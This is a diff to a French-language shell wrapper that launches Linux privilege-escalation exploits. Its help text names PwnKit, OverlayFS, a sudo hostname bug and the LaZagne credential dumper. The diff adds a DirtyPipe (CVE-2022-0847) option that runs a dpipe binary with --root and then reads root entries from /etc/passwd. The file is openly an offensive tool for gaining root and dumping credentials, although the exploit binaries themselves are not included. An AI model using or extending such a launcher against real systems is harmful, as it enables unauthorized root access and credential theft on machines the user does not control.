@@ -27,6 +27,7 @@ if [[ "$*" == "-help" ]]; then
     echo "   -LaZagne       Execute LaZagne"
     echo "   -Overlays      Compilation + execution binaire - CVE-2015-1328"
     echo "   -PwnKit64/32   PwnKit64/32 - CVE-2021-4034"
+    echo "   -DirtyPipe     DirtyPipe - CVE-2022-0847"
     echo "   -SudoHost      Sudo Hostname - CVE-2025-32462"
     echo "   -check         Verifie si gcc est installer"
     echo "   -perm          Applique les droit d'execution sur '/fullEx'"
@@ -74,4 +75,10 @@ fi
 # Sudo-Host
 if [[ "$*" == "-SudoHost" ]]; then
      "${PWD}/exploit/Sudo-host/exploit.sh"
+fi
+
+# DirtyPipe
+if [[ "$*" == "-DirtyPipe" ]]; then
+     ${PWD}/exploits/DirtyPipe/dpipe --root
+     cat /etc/passwd | grep root
 fi
